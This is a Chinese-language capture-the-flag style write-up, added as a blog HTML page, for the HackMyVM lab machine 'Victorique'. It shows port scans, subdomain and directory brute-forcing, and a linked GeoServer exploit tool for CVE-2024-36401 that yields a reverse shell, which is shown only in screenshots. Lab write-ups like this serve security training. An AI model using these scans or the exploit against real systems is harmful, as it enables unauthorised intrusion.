@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="もう二度と戻れないの？ここは始まりか、終わりか  信息收集12345678910111213141516171819202122232425262728293031323334353637383940414243.&#x2F;rustscan -a 192.168.56.106.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Victorique">
+<meta property="og:url" content="http://example.com/2026/01/09/HackMyVM-Victorique/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="もう二度と戻れないの？ここは始まりか、終わりか  信息收集12345678910111213141516171819202122232425262728293031323334353637383940414243.&#x2F;rustscan -a 192.168.56.106.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_6qBqwbZpQs.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_ZKVVU1U0R8.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_hy6pluPpTX.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_WCgbVFgajd.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/gui-exp_LtfX5iafUT.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_5etpTKgXs9.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_2dPUiqO76g.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_UsWLTGtRfU.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_5N6j5Z7Pae.png">
+<meta property="og:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/Photos_mQpaENkWFY.png">
+<meta property="article:published_time" content="2026-01-09T01:11:19.000Z">
+<meta property="article:modified_time" content="2026-01-09T02:03:20.890Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/01/09/HackMyVM-Victorique/vmware_6qBqwbZpQs.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackMyVM-Victorique - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackMyVM-Victorique"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-09 09:11" pubdate>
+          January 9, 2026 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackMyVM-Victorique</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>もう二度と戻れないの？<br>ここは始まりか、終わりか</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">./rustscan -a <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span><br>.<span class="hljs-comment">----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`<span class="hljs-comment">-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> <span class="hljs-comment">--------------------------------------</span><br>Nmap? More <span class="hljs-keyword">like</span> slowmap.🐢<br><br>[~] The config file <span class="hljs-keyword">is</span> expected <span class="hljs-keyword">to</span> be at &quot;/root/.rustscan.toml&quot;<br>[!] File <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> lower than <span class="hljs-keyword">default</span> batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span><br>[!] Your file <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-string">&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;</span><span class="hljs-comment">--ulimit 5000&#x27;. </span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span>:<span class="hljs-number">22</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span>:<span class="hljs-number">80</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.95</span> ( https://nmap.org ) at <span class="hljs-number">2026</span><span class="hljs-number">-01</span><span class="hljs-number">-08</span> <span class="hljs-number">19</span>:<span class="hljs-number">14</span> EST<br>Initiating ARP Ping Scan at <span class="hljs-number">19</span>:<span class="hljs-number">14</span><br>Scanning <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span> [<span class="hljs-number">1</span> port]<br>Completed ARP Ping Scan at <span class="hljs-number">19</span>:<span class="hljs-number">14</span>, <span class="hljs-number">0.08</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">14</span><br>Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">19</span>:<span class="hljs-number">14</span>, <span class="hljs-number">0.03</span>s elapsed<br>DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.03</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]<br>Initiating SYN Stealth Scan at <span class="hljs-number">19</span>:<span class="hljs-number">14</span><br>Scanning <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span> [<span class="hljs-number">2</span> ports]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">22</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span><br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">80</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span><br>Completed SYN Stealth Scan at <span class="hljs-number">19</span>:<span class="hljs-number">14</span>, <span class="hljs-number">0.03</span>s elapsed (<span class="hljs-number">2</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.106</span><br>Host <span class="hljs-keyword">is</span> up, received arp-response (<span class="hljs-number">0.0010</span>s latency).<br>Scanned at <span class="hljs-number">2026</span><span class="hljs-number">-01</span><span class="hljs-number">-08</span> <span class="hljs-number">19</span>:<span class="hljs-number">14</span>:<span class="hljs-number">52</span> EST <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>s<br><br>PORT   STATE SERVICE REASON<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh     syn-ack ttl <span class="hljs-number">64</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    syn-ack ttl <span class="hljs-number">64</span><br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">7</span>C:<span class="hljs-number">51</span>:<span class="hljs-number">17</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br><br><span class="hljs-keyword">Read</span> data files <span class="hljs-keyword">from</span>: /usr/<span class="hljs-keyword">share</span>/nmap<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.25</span> seconds<br>           Raw packets sent: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)<br><br></code></pre></td></tr></table></figure>
+
+<p>访问80端口，发现要我们添加域名victorique.xyz。</p>
+<p>添加完之后是个前端界面。</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_6qBqwbZpQs.png" srcset="/img/loading.gif" lazyload></p>
+<p>常规的目录爆破和子域名爆破</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌──(root㉿kali)-[/home/kali/Desktop]<br><span class="hljs-section">└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://victorique.xyz/ --append-domain -t 25 | grep -v &quot;301&quot;</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.8<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:                       http://victorique.xyz/<br>[+] Method:                    GET<br>[+] Threads:                   25<br>[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:                gobuster/3.8<br>[+] Timeout:                   10s<br>[+] Append Domain:             true<br>[+] Exclude Hostname Length:   false<br>===============================================================<br>Starting gobuster in VHOST enumeration mode<br>===============================================================<br>gifts.victorique.xyz Status: 200 [Size: 8367]<br>#www.victorique.xyz Status: 400 [Size: 299]<br>#mail.victorique.xyz Status: 400 [Size: 299]<br>#smtp.victorique.xyz Status: 400 [Size: 299]<br>#pop3.victorique.xyz Status: 400 [Size: 299]<br>===============================================================<br>Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure>
+
+<p>发现另外一个域名，查看后给了一个用户和密码</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_ZKVVU1U0R8.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# feroxbuster -u http:<span class="hljs-comment">//victorique.xyz/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,zip,txt,html,htm --scan-dir-listings  -C 503</span><br>                                                                                                                                                           <br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: <span class="hljs-number">2.13</span><span class="hljs-number">.0</span><br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http:<span class="hljs-comment">//victorique.xyz/</span><br> 🚩  In-Scope Url          │ victorique.xyz<br> 🚀  Threads               │ <span class="hljs-number">50</span><br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list<span class="hljs-number">-2.3</span>-medium.txt<br> 💢  Status Code Filters   │ [<span class="hljs-number">503</span>]<br> 💥  Timeout (secs)        │ <span class="hljs-number">7</span><br> 🦡  User-Agent            │ feroxbuster/<span class="hljs-number">2.13</span><span class="hljs-number">.0</span><br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ true<br> 📂  Scan Dir Listings     │ true<br> 💲  Extensions            │ [php, zip, txt, html, htm]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ <span class="hljs-number">4</span><br> 🎉  New Version Available │ https:<span class="hljs-comment">//github.com/epi052/feroxbuster/releases/latest</span><br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br><span class="hljs-number">404</span>      GET        <span class="hljs-number">9</span>l       <span class="hljs-number">31</span>w      <span class="hljs-number">276</span>c Auto-filtering found <span class="hljs-number">404</span>-like response and created new filter; toggle off <span class="hljs-keyword">with</span> --dont-filter<br><span class="hljs-number">403</span>      GET        <span class="hljs-number">9</span>l       <span class="hljs-number">28</span>w      <span class="hljs-number">279</span>c Auto-filtering found <span class="hljs-number">404</span>-like response and created new filter; toggle off <span class="hljs-keyword">with</span> --dont-filter<br><span class="hljs-number">200</span>      GET      <span class="hljs-number">196</span>l      <span class="hljs-number">628</span>w     <span class="hljs-number">8326</span>c http:<span class="hljs-comment">//victorique.xyz/index</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">102</span>l      <span class="hljs-number">396</span>w     <span class="hljs-number">4980</span>c http:<span class="hljs-comment">//victorique.xyz/library</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">151</span>l      <span class="hljs-number">472</span>w     <span class="hljs-number">7209</span>c http:<span class="hljs-comment">//victorique.xyz/profile</span><br><span class="hljs-number">301</span>      GET        <span class="hljs-number">9</span>l       <span class="hljs-number">28</span>w      <span class="hljs-number">316</span>c http:<span class="hljs-comment">//victorique.xyz/image =&gt; http://victorique.xyz/image/</span><br><span class="hljs-number">200</span>      GET     <span class="hljs-number">1914</span>l    <span class="hljs-number">11013</span>w   <span class="hljs-number">828758</span>c http:<span class="hljs-comment">//victorique.xyz/image/vtr.png</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">306</span>l      <span class="hljs-number">820</span>w    <span class="hljs-number">10959</span>c http:<span class="hljs-comment">//victorique.xyz/login</span><br><span class="hljs-number">200</span>      GET      <span class="hljs-number">196</span>l      <span class="hljs-number">628</span>w     <span class="hljs-number">8326</span>c http:<span class="hljs-comment">//victorique.xyz/</span><br>[####################] - <span class="hljs-number">23</span>m  <span class="hljs-number">1323330</span>/<span class="hljs-number">1323330</span> <span class="hljs-number">0</span>s      found:<span class="hljs-number">7</span>       errors:<span class="hljs-number">0</span>      <br>[####################] - <span class="hljs-number">23</span>m  <span class="hljs-number">1323270</span>/<span class="hljs-number">1323270</span> <span class="hljs-number">967</span>/s   http:<span class="hljs-comment">//victorique.xyz/ </span><br>[####################] - <span class="hljs-number">23</span>m  <span class="hljs-number">1323270</span>/<span class="hljs-number">1323270</span> <span class="hljs-number">960</span>/s   http:<span class="hljs-comment">//victorique.xyz/image/ </span><br></code></pre></td></tr></table></figure>
+
+<p>同时爆破的也出结果了，尝试用给的凭据登录，但失败，提示我们被骗了。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# feroxbuster -u http://gifts.victorique.xyz/ -w /usr/<span class="hljs-keyword">share</span>/seclists/Discovery/Web-Content/directory-list<span class="hljs-number">-2.3</span>-medium.txt  -x php,zip,txt,html,htm <span class="hljs-comment">--scan-dir-listings  -C 503</span><br>                                                                                                                                                           <br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br><span class="hljs-keyword">by</span> Ben &quot;epi&quot; Risher 🤓                 ver: <span class="hljs-number">2.13</span><span class="hljs-number">.0</span><br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://gifts.victorique.xyz/<br> 🚩  <span class="hljs-keyword">In</span>-Scope Url          │ gifts.victorique.xyz<br> 🚀  Threads               │ <span class="hljs-number">50</span><br> 📖  Wordlist              │ /usr/<span class="hljs-keyword">share</span>/seclists/Discovery/Web-Content/directory-list<span class="hljs-number">-2.3</span>-medium.txt<br> 💢  Status Code Filters   │ [<span class="hljs-number">503</span>]<br> 💥  Timeout (secs)        │ <span class="hljs-number">7</span><br> 🦡  <span class="hljs-keyword">User</span>-Agent            │ feroxbuster/<span class="hljs-number">2.13</span><span class="hljs-number">.0</span><br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-keyword">true</span><br> 📂  Scan Dir Listings     │ <span class="hljs-keyword">true</span><br> 💲  Extensions            │ [php, zip, txt, html, htm]<br> 🏁  HTTP methods          │ [<span class="hljs-keyword">GET</span>]<br> 🔃  Recursion Depth       │ <span class="hljs-number">4</span><br> 🎉  <span class="hljs-built_in">New</span> <span class="hljs-keyword">Version</span> Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] <span class="hljs-keyword">to</span> use the Scan Management Menu™<br>──────────────────────────────────────────────────<br><span class="hljs-number">403</span>      <span class="hljs-keyword">GET</span>        <span class="hljs-number">9</span>l       <span class="hljs-number">28</span>w      <span class="hljs-number">285</span>c Auto-filtering <span class="hljs-built_in">found</span> <span class="hljs-number">404</span>-<span class="hljs-keyword">like</span> response <span class="hljs-keyword">and</span> created <span class="hljs-built_in">new</span> <span class="hljs-keyword">filter</span>; toggle <span class="hljs-keyword">off</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--dont-filter</span><br><span class="hljs-number">404</span>      <span class="hljs-keyword">GET</span>        <span class="hljs-number">9</span>l       <span class="hljs-number">31</span>w      <span class="hljs-number">282</span>c Auto-filtering <span class="hljs-built_in">found</span> <span class="hljs-number">404</span>-<span class="hljs-keyword">like</span> response <span class="hljs-keyword">and</span> created <span class="hljs-built_in">new</span> <span class="hljs-keyword">filter</span>; toggle <span class="hljs-keyword">off</span> <span class="hljs-keyword">with</span> <span class="hljs-comment">--dont-filter</span><br><span class="hljs-number">200</span>      <span class="hljs-keyword">GET</span>      <span class="hljs-number">199</span>l      <span class="hljs-number">650</span>w     <span class="hljs-number">8367</span>c http://gifts.victorique.xyz/<br><span class="hljs-number">200</span>      <span class="hljs-keyword">GET</span>      <span class="hljs-number">199</span>l      <span class="hljs-number">650</span>w     <span class="hljs-number">8367</span>c http://gifts.victorique.xyz/<span class="hljs-keyword">index</span>.html<br><span class="hljs-number">200</span>      <span class="hljs-keyword">GET</span>       <span class="hljs-number">57</span>l      <span class="hljs-number">935</span>w     <span class="hljs-number">9785</span>c http://gifts.victorique.xyz/greatgifts.txt<br><br></code></pre></td></tr></table></figure>
+
+<p>不过子域名的目录爆破有结果。<img src="/2026/01/09/HackMyVM-Victorique/vmware_hy6pluPpTX.png" srcset="/img/loading.gif" lazyload></p>
+<p>（这里我以为这个才是真的密码，但是仍然登录不了，后来才知道是子域名）</p>
+<p>添加到子域名后，发现是geoserver。</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_WCgbVFgajd.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Getvictorique"><a href="#Getvictorique" class="headerlink" title="Getvictorique"></a>Getvictorique</h3><hr>
+<p>找了一个利用工具打cve 2024 36401</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/netuseradministrator/Geoserver_gui_exp">netuseradministrator&#x2F;Geoserver_gui_exp: Geoserver综合利用工具</a></p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/gui-exp_LtfX5iafUT.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功弹回shell</p>
+<p><img src="/2026/01/09/HackMyVM-Victorique/vmware_5etpTKgXs9.png" srcset="/img/loading.gif" lazyload></p>
